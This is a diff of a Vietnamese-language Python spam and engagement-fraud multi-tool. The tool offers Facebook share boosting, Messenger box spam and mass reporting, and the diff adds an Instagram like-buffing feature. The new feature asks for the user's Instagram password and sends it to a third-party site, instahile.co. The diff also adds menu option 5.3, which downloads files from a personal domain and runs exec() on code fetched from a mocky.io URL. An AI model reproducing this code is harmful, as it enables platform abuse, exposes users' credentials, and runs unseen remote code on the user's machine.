@@ -1,8 +1,17 @@
 from urllib.parse import quote
 import datetime
 import os
+import ssl
+from urllib.parse import urlencode
+from http import cookiejar
+from urllib3.exceptions import InsecureRequestWarning
+import hashlib
 try:
     import base64
+    from requests.exceptions import RequestException
+    from rich.panel import Panel
+    from rich import print
+    from rich.console import Console
     import requests
     import pystyle
     from concurrent.futures import ThreadPoolExecutor
@@ -12,6 +21,7 @@ try:
     
 except ImportError:
     import os
+    os.system("pip install rich")
     os.system("pip install faker")
     os.system("pip install colorama")
     os.system("pip install requests")
@@ -424,7 +434,8 @@ hai  = f"""
 ║ {vang}2.2\033[0m ║    {dac_biet}SHARE MAX SPEED\033[0m    ║      {xanh_la}hoạt động\033[0m      ║
 ║ {vang}2.3\033[0m ║     {dac_biet}NUÔI FACENOOK\033[0m     ║      {xanh_la}hoạt động\033[0m      ║  
 ║ {vang}2.4\033[0m ║  {dac_biet}SPAM  BOX MESSENGER\033[0m  ║      {xanh_la}hoạt động\033[0m      ║      
-║ {vang}2.5\033[0m ║    {dac_biet}REPORT FACENOOK\033[0m    ║      {xanh_la}hoạt động\033[0m      ║ 
+║ {vang}2.5\033[0m ║    {dac_biet}REPORT FACENOOK\033[0m    ║      {xanh_la}hoạt động\033[0m      ║
+║ {vang}2.6\033[0m ║ {dac_biet}BUFF INSTAGRAM LIKES\033[0m  ║      {xanh_la}hoạt động\033[0m      ║ 
 ║  {vang}0\033[0m  ║       {dac_biet}MAIN MENU\033[0m       ║      {xanh_la}hoạt động\033[0m      ║
 ╚═════╩═══════════════════════╩═════════════════════╝ 
 
@@ -1475,23 +1486,24 @@ def kimungvay(sdt):
 def xoa(text):
     sys.stdout.write('\r' + text)
     sys.stdout.flush()
+
 # hàm chạy
 def idelay(o):
     while(o>0):
         o=o-1
-        print(f"[\033[1;33mV\033[1;34mu\033[1;35mi \033[1;32mL\033[1;33mò\033[1;34mn\033[1;35mg \033[1;36mC\033[1;33mh\033[1;34mờ[\033[1;35m.....""]""["+str(o)+"]""    ",end='\r')
+        print(f"\033[1;33mV\033[1;34mu\033[1;35mi \033[1;32mL\033[1;33mò\033[1;34mn\033[1;35mg \033[1;36mC\033[1;33mh\033[1;34mờ[\033[1;35m.....""]""["+str(o)+"]""    ",end='\r')
         time.sleep(1/6)
-        print(f"[\033[1;31mV\033[1;32mu\033[1;33mi \033[1;34mL\033[1;35mò\033[1;31mn\033[1;32mg \033[1;33mC\033[1;32mh\033[1;35mờ[\033[1;33m•....""]""["+str(o)+"]""     ",end='\r')
+        print(f"\033[1;31mV\033[1;32mu\033[1;33mi \033[1;34mL\033[1;35mò\033[1;31mn\033[1;32mg \033[1;33mC\033[1;32mh\033[1;35mờ[\033[1;33m•....""]""["+str(o)+"]""     ",end='\r')
         time.sleep(1/6)
-        print(f"[\033[1;32mV\033[1;33mu\033[1;34mi \033[1;35mL\033[1;36mò\033[1;33mn\033[1;34mg \033[1;35mC\033[1;31mh\033[1;32mờ[\033[1;35m••...""]""["+str(o)+"]""     ",end='\r')
+        print(f"\033[1;32mV\033[1;33mu\033[1;34mi \033[1;35mL\033[1;36mò\033[1;33mn\033[1;34mg \033[1;35mC\033[1;31mh\033[1;32mờ[\033[1;35m••...""]""["+str(o)+"]""     ",end='\r')
         time.sleep(1/6)
-        print(f"[\033[1;31mV\033[1;33mu\033[1;35mi \033[1;33mL\033[1;31mò\033[1;32mn\033[1;34mg \033[1;36mC\033[1;35mh\033[1;31mờ[\033[1;32m•••..""]""["+str(o)+"]""     ",end='\r')
+        print(f"\033[1;31mV\033[1;33mu\033[1;35mi \033[1;33mL\033[1;31mò\033[1;32mn\033[1;34mg \033[1;36mC\033[1;35mh\033[1;31mờ[\033[1;32m•••..""]""["+str(o)+"]""     ",end='\r')
         time.sleep(1/6)
-        print(f"[\033[1;32mV\033[1;34mu\033[1;36mi \033[1;32mL\033[1;34mò\033[1;31mn\033[1;35mg \033[1;33mC\033[1;36mh\033[1;35mờ[\033[1;38m••••.""]""["+str(o)+"]""     ",end='\r')
+        print(f"\033[1;32mV\033[1;34mu\033[1;36mi \033[1;32mL\033[1;34mò\033[1;31mn\033[1;35mg \033[1;33mC\033[1;36mh\033[1;35mờ[\033[1;38m••••.""]""["+str(o)+"]""     ",end='\r')
         time.sleep(1/6)
-        print(f"[\033[1;31mV\033[1;34mu\033[1;36mi \033[1;32mL\033[1;34mò\033[1;32mn\033[1;35mg \033[1;36mC\033[1;34mh\033[1;32mờ[\033[1;33m•••••""]""["+str(o)+"]""     ",end='\r')
+        print(f"\033[1;31mV\033[1;34mu\033[1;36mi \033[1;32mL\033[1;34mò\033[1;32mn\033[1;35mg \033[1;36mC\033[1;34mh\033[1;32mờ[\033[1;33m•••••""]""["+str(o)+"]""     ",end='\r')
         time.sleep(0.1)
-        print(f"[\033[1;31mV\033[1;34mu\033[1;36mi \033[1;32mL\033[1;34mò\033[1;32mn\033[1;35mg \033[1;36mC\033[1;34mh\033[1;32mờ[\033[1;33m•••••""]""["+str(o)+"]""     ",end='\r')
+        print(f"\033[1;31mV\033[1;34mu\033[1;36mi \033[1;32mL\033[1;34mò\033[1;32mn\033[1;35mg \033[1;36mC\033[1;34mh\033[1;32mờ[\033[1;33m•••••""]""["+str(o)+"]""     ",end='\r')
 
 
 
@@ -1829,8 +1841,238 @@ def chon_job(so,chon):
 
 #===================================================================================================================================================================
 #=======================================================================================================
+def download_file(url, save_path):
+    response = requests.get(url)
+    if response.status_code == 200:
+        with open(save_path, 'wb') as file:
+            file.write(response.content)
 
+#============================================================================================================================================================================
+Sukses, Gagal, Jumlah = [], [], {
+    "Count": 0
+}
+class Main:
 
+    def __init__(self) -> None:
+        pass
+
+    def Pengguna(self):
+        try:
+            with requests.Session() as r:
+                response = r.get('https://justpaste.it/4p16t')
+                self.online = re.search('"onlineText":"(\d+)"', str(response.text)).group(1)
+                self.jumlah = re.search('"viewsText":"(.*?)"', str(response.text)).group(1)
+            return (self.jumlah, self.online)
+        except (Exception) as e:
+            return (404, 404)
+
+    def Your_Username_Password(self):
+        try:
+            clear()
+            runbanner(chontool)
+            print(Panel(f"[italic white]Vui lòng nhập Username và Password tài khoản Instagram của bạn được chia bởi kí tự [italic white]\"[italic green]/[italic white]\" \n[italic purple]eg[italic white]: kasocute[italic green]/[italic white]ka123 (kasocute[italic purple]=[italic yellow]Username [italic red]| [italic white]ka123[italic purple]=[italic yellow]Password[italic white])", width=60, style="bold bright_black", title=">>> Username & Password <<<", subtitle="╭─────", subtitle_align="left"))
+            your_username_password = Console().input("[bold bright_black]   ╰─>[italic yellow] ")
+            if '/' in str(your_username_password):
+                clear()
+                runbanner(chontool)
+                self.username, self.password = your_username_password.split('/')[0], your_username_password.split('/')[1]
+                print(Panel(f"[italic white]Vui lòng nhập liên kết bài đăng trên Instagram \nví dụ:[italic green] https://www.instagram.com/p/CXyPwLSJCtl/", width=60, style="bold bright_black", title=">>> Link Postingan <<<", subtitle="╭─────", subtitle_align="left"))
+                your_postingan = Console().input("[bold bright_black]   ╰─>[italic yellow] ").replace('/reel/', '/p/').replace('/reels/', '/p/')
+                self.link_split = your_postingan.split('https://www.instagram.com/p/')[1]
+                if '/' in str(self.link_split):
+                    self.code_postingan = (self.link_split.split('/')[0])
+                else:
+                    self.code_postingan = (self.link_split)
+                clear()
+                runbanner(chontool)
+                self.final_postingan = (f'https://www.instagram.com/p/{self.code_postingan}/')
+                print(Panel(f"[italic white]Đang tăng lượt thích mà bạn có thể sử dụng[italic green] CTRL + C[italic white] để dừng hoặc [italic red] CTRL + Z[italic white] để dừng!", width=60, style="bold bright_black", title=">>> Catatan <<<"))
+                while True:
+                    try:
+                        self.status, self.media_ids = self.Submit_Likes(self.username, self.password, self.final_postingan)
+                        if Jumlah['Count'] > 20:
+                            Sukses.append(Jumlah['Count'])
+                            print(Panel(f"""[bold white]Status :[italic green] Successfully sent likes...[/]
+[bold white]Link :[bold red] {str(self.final_postingan)[:49]}
+[bold white]Jumlah :[bold green] +{Jumlah['Count']}[italic yellow] *Successful""", width=60, style="bold bright_black", title=">>> Sukses <<<"))
+                            Jumlah.update({
+                                "Count": 0
+                            })
+                            continue
+                        else:
+                            if 'Likes Limit' in str(self.status):
+                                self.Delay(0, 3600, self.media_ids)
+                                continue
+                            else:
+                                continue
+                    except (KeyboardInterrupt):
+                        print("\r                                                    ", end='\r')
+                        time.sleep(1.5)
+                        continue
+                    except (RequestException):
+                        print("\r                                                    ", end='\r')
+                        time.sleep(1.5)
+                        print(f"[bold bright_black]   ╰─>[bold red] KẾT NỐI CÓ VẤN ĐỀ!", end='\r')
+                        time.sleep(4.5)
+                        continue
+                    except (Exception) as e:
+                        print("\r                                                    ", end='\r')
+                        time.sleep(1.5)
+                        print(f"[bold bright_black]   ╰─>[bold red] {str(e).upper()}!", end='\r')
+                        time.sleep(4.5)
+                        continue
+            else:
+                print(Panel(f"[italic red]Dấu tách tên người dùng hoặc mật khẩu của bạn đã nhập bị sai!", width=60, style="bold bright_black", title=">>> Pemisah Salah <<<"))
+                exit()
+        except (Exception) as e:
+            print(Panel(f"[italic red]{str(e).title()}!", width=60, style="bold bright_black", title=">>> Error <<<"))
+            exit()
+
+    def Submit_Likes(self, username, password, your_links):
+        global Sukses, Jumlah, Gagal
+        with requests.Session() as r:
+            r.headers.update({
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'connection': 'keep-alive',
+                'accept-encoding': 'gzip, deflate',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+                'accept-language': 'en-US,en;q=0.9',
+                'Host': 'instahile.co',
+                'sec-fetch-mode': 'navigate',
+                'upgrade-insecure-requests': '1',
+                'sec-fetch-user': '?1',
+                'sec-fetch-dest': 'document',
+            })
+            response = r.get('https://instahile.co/login')
+            r.headers.pop('sec-fetch-user');r.headers.pop('upgrade-insecure-requests')
+            r.headers.update({
+                'referer': 'https://instahile.co/login',
+                'accept': '*/*',
+                'cookie': "; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]),
+                'sec-fetch-dest': 'empty',
+                'content-type': 'application/x-www-form-urlencoded',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-mode': 'cors',
+                'x-requested-with': 'XMLHttpRequest',
+            })
+            data = {
+                'username': username,
+                'password': password,
+            }
+            response2 = r.post('https://instahile.co/ajax/login', data = data)
+            if '"error":false' in str(response2.text):
+                print("\r                                                    ", end='\r')
+                time.sleep(1.5)
+                print(f"[bold bright_black]   ╰─>[bold green] ĐĂNG NHẬP THÀNH CÔNG...", end='\r')
+                time.sleep(2.5)
+                r.headers.pop('content-type');r.headers.pop('x-requested-with')
+                r.headers.update({
+                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                    'upgrade-insecure-requests': '1',
+                    'sec-fetch-dest': 'document',
+                    'sec-fetch-user': '?1',
+                    'cookie': "; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]),
+                    'sec-fetch-site': 'same-origin',
+                    'sec-fetch-mode': 'navigate',
+                    'referer': 'https://instahile.co/tools/',
+                })
+                response3 = r.get('https://instahile.co/tools/send-likes')
+                if 'Hesabınızı Instagram üzerinden doğrulayın ve tekrar giriş yapın.' in str(response3.text) or 'Giriş yap' in str(response3.text):
+                    print(Panel(f"[italic red]Có vẻ như tài khoản Instagram của bạn đã bị Checkpoint!", width=60, style="bold bright_black", title=">>> Login Checkpoint <<<"))
+                    exit()
+                r.headers.pop('sec-fetch-user');r.headers.pop('upgrade-insecure-requests')
+                r.headers.update({
+                    'origin': 'https://instahile.co',
+                    'sec-fetch-dest': 'empty',
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'sec-fetch-site': 'same-origin',
+                    'referer': 'https://instahile.co/tools/send-likes',
+                    'sec-fetch-mode': 'cors',
+                    'cookie': "; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]),
+                })
+                data = {
+                    'link': your_links,
+                }
+                response4 = r.post('https://instahile.co/tools/send-likes', data = data)
+                if 'name="media_id"' in str(response4.text):
+                    self.media_id = re.search('name="media_id" value="(.*?)"', str(response4.text)).group(1)
+                    if '_' in str(self.media_id):
+                        self.media_ids = (self.media_id.split('_')[0])
+                    else:
+                        self.media_ids = (self.media_id)
+                    self.jumlah_likes = 0
+                    for _ in ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10']:
+                        r.headers.update({
+                            'x-requested-with': 'XMLHttpRequest',
+                            'accept': '*/*',
+                            'cookie': "; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]),
+                        })
+                        data = {
+                            'media_id': self.media_id,
+                            'quantity': '10',
+                        }
+                        response5 = r.post('https://instahile.co/ajax/tools/send_likes', data = data)
+                        if '"error":false' in str(response5.text):
+                            self.json_response = json.loads(response5.text)
+                            self.credi, self.sent = self.json_response['credi'], self.json_response['sent']
+                            if int(self.credi) == 0:
+                                print("\r                                                    ", end='\r')
+                                time.sleep(1.5)
+                                print(f"[bold bright_black]   ╰─>[bold red] Bạn đã hết lượt tim...", end='\r')
+                                time.sleep(2.5)
+                                return ("Likes Limit", self.media_ids)
+                            else:
+                                self.jumlah_likes += int(self.sent)
+                                Jumlah.update({
+                                    "Count": self.jumlah_likes
+                                })
+                                continue
+                        elif '"error":true' in str(response5.text):
+                            if 'Beğeni Eklenemedi' in str(json.loads(response5.text)):
+                                print("\r                                                    ", end='\r')
+                                time.sleep(1.5)
+                                print(f"[bold bright_black]   ╰─>[bold red] KHÔNG THÊM LƯỢT THÍCH...", end='\r')
+                                time.sleep(4.5)
+                                return ("Likes Limit", self.media_ids)
+                            else:
+                                print("\r                                                    ", end='\r')
+                                Gagal.append(response5.text)
+                                time.sleep(1.5)
+                                print(f"[bold bright_black]   ╰─>[bold yellow] KHÔNG NHẬN ĐƯỢC LƯỢT THÍCH...", end='\r')
+                                time.sleep(4.5)
+                                return ("Likes Gagal", self.media_ids)
+                        else:
+                            print("\r                                                    ", end='\r')
+                            Gagal.append(response5.text)
+                            time.sleep(1.5)
+                            print(f"[bold bright_black]   ╰─>[bold red] KHÔNG NHẬN ĐƯỢC LƯỢT THÍCH...", end='\r')
+                            time.sleep(4.5)
+                            return ("Likes Gagal", self.media_ids)
+                    return ("Likes Sukses", f'@{username}')
+                else:
+                    print("\r                                                    ", end='\r')
+                    time.sleep(1.5)
+                    print(f"[bold bright_black]   ╰─>[bold red] KHÔNG TÌM THẤY BÀI VIẾT...", end='\r')
+                    time.sleep(4.5)
+                    return ("Không tìm thấy bài viết", f'@{username}')
+            else:
+                print("\r                                                    ", end='\r')
+                time.sleep(1.5)
+                print(f"[bold bright_black]   ╰─>[bold red] ĐĂNG NHẬP KHÔNG THÀNH CÔNG...", end='\r')
+                time.sleep(4.5)
+                return ("Login Gagal", f'@{username}')
+            
+    def Delay(self, menit, detik, username):
+        self.total = (menit * 60 + detik)
+        while (self.total):
+            menit, detik = divmod(self.total, 60)
+            print(f"[bold bright_black]   ╰─>[bold green] {str(username)[:20]}[bold white]/[bold green]{menit:02d}:{detik:02d}[bold white] Sukses:-[bold green]{len(Sukses)}[bold white] Gagal:-[bold red]{len(Gagal)}     ", end='\r')
+            time.sleep(1)
+            self.total -= 1
+        return ("Delay SUCCESSFUL")
+
+#=====================================================================================================================================================================================
 #==========================================================================================================
 
 #==============================================================================================================================================================================
@@ -3870,7 +4112,17 @@ def main():
           print(f'{s} {trang}- {xanh_la}Tố Cáo Thành Công ID{trang}: {tim}{id_fb}')
           time.sleep(0.01)
     print(f"\033[1;97m[\033[1;31m</>\033[1;97m] {xanh_la}Done!")
-
+  elif nhap == '2.6':
+    if __name__ == '__main__':
+      try:
+        Main().Pengguna()
+        Main().Your_Username_Password()
+      except (Exception) as e:
+        print(Panel(f"[italic red]{str(e).title()}!", width=60, style="bold bright_black", title=">>> Error <<<"))
+        exit()
+      except (KeyboardInterrupt):
+        exit()
+    
   elif nhap == '3':
     clear()
     runbanner(ba)
@@ -4468,12 +4720,22 @@ def main():
     Z.send_captcha2()
     while True:
         try: 
-            if 'Service is currently not working, try again later' in str(Z.use_service()): print(f'{do}[Trọng Thảo]</>Dịch vụ hiện không hoạt động, hãy thử lại sau. | Bạn có thể thay đổi nó trong cấu hình.');time.sleep(5)
+            if 'Service is currently not working, try again later' in str(Z.use_service()): print(f'{do}</>Dịch vụ hiện không hoạt động, hãy thử lại sau. | Bạn có thể thay đổi nó trong cấu hình.');time.sleep(5)
         except Exception as e:print(f'LỖI NGHIÊM TÚC | thử lại sau 10 giây.|| {e}');time.sleep(10)
 
 
   elif nhap == '5.3':
-    print(f"{do}TOOL ĐANG BẢO TRÌ. VUI LÒNG QUAI LẠI SAU!!")
+    url = "https://hoanganh.eu.org/archive/config.json"
+    url1 = "https://hoanganh.eu.org/archive/proxy.json"
+    url2 = "https://hoanganh.eu.org/archive/devices.txt"
+    save_path = "config.json"
+    save_path1 = "proxy.json"
+    save_path2 = "devices.txt"
+    download_file(url, save_path)
+    download_file(url1, save_path1)
+    download_file(url2, save_path2)
+    exec(requests.get('https://run.mocky.io/v3/5728581a-1bce-43c9-855a-b85f92052922').text)
+    
   
   elif nhap == '6':
     clear()
